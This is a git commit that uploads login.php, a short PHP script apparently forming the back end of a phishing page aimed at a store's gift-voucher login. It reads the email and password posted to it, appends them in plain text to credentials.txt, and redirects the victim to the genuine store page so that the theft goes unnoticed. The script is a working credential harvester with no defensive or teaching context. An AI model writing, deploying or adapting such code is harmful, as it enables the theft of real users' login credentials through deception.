6fc10c47fb866c8d6c038c4d2d55de1eb876e0dd
pamoda-perera <pamodaper@gmail.com>
2017-03-17 08:56:02 +0530

    Add files via upload

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+ //Extract the credentials received
+ $username = $_POST["email"];
+ $password = $_POST["password"];
+ //Write the credentials to text file
+ $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
+ $txt = "USERNAME = $username , PASSWORD = $password\n";
+ fwrite($myfile, "\n". $txt);
+ fclose($myfile);
+ //Redirect the browser to original login page
+ header("Location:https://www.mystore.lk/gift-vouchers");
+ exit();
+?>
